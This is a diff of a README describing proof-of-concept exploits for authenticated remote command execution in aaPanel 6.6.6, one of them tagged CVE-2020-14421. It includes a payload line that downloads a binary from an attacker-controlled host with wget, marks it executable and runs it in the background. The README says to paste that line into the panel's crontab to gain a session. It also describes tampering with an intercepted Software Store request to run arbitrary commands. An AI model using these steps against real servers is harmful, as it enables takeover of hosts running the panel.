@@ -1,34 +1,23 @@
 # aapanel
 
-
-
 ## aapanel 6.6.6 - CVE-XXX
 
 * Description : allows remote authenticated users to execute arbitrary commands via the setting menu of Sotfware Store.
 * Affected version : All <= 6.6.6
 
-
 ### Information
 
 To make this PoC, I just installed the software using docker-compose
 
-* Vulnerability Type : Remote command execution (RCE Authenticated)
+* Vulnerability Type : Remote command execution (Authenticated RCE)
 
 ### POC
-
 
 Go to Software Store, click on any row from the setting's field, intercept the request when you click on "start/stop/restart" and modify/edit the resquest to execute what you want. Here is an example with curl : 
 
 <img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/injectionCommandStore.png">
 
 <img width="1280" alt="receStore" src="https://raw.githubusercontent.com/jenaye/aapanel/master/getCurl.png">
-
-
-
-
-
-
-
 
 ## aapanel 6.6.6 - CVE-2020-14421
 
@@ -53,20 +42,15 @@ Now run it
 
 this will generate the following payload: 
 
- `wget -qO wt8v00sC --no-check-certificate http://xxxx:8088/gUVn1orp; chmod +x wt8v00sC; ./wt8v00sC& disown`
-
+`wget -qO wt8v00sC --no-check-certificate http://xxxx:8088/gUVn1orp; chmod +x wt8v00sC; ./wt8v00sC& disown`
 
 Then  copy/past like this into `script content` of crontab menu in aapanel.
 
-
 <img width="1280" alt="cron" src="https://raw.githubusercontent.com/jenaye/aapanel/master/cron.png">
-
 
 Now just execute your crontab and wait your session.
 
-
 <img width="1280" alt="command" src="https://raw.githubusercontent.com/jenaye/aapanel/master/command.png">
-
 
 ### Fast Exploit
 
